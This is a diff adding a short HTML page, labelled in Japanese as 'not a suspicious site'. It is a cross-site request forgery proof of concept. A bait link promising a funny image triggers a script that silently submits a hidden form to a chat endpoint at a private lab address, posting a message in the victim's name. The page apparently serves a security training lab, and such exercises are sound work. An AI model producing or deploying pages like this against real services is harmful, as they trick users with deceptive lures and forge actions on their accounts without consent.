@@ -1,0 +1,14 @@
+<h1>?? 怪しくないサイト ??</h1>
+<a href="kansen.html" id="link" target="_blank">超面白い画像はこちら！このボタンを押してみてね→</a>
+<form novalidate="novalidate" style="display: none;" method="get" name = "trap">
+	<input type="hidden" name="body" value="不正に書き込みしてみたよ">
+</form>
+
+<script>
+  const targetURL = 'http://192.168.56.101/chat';
+  const link = document.getElementById('link');
+  link.addEventListener('click', function(e) {
+    document.forms.trap.action = targetURL;
+    document.forms.trap.submit();
+  });
+</script>
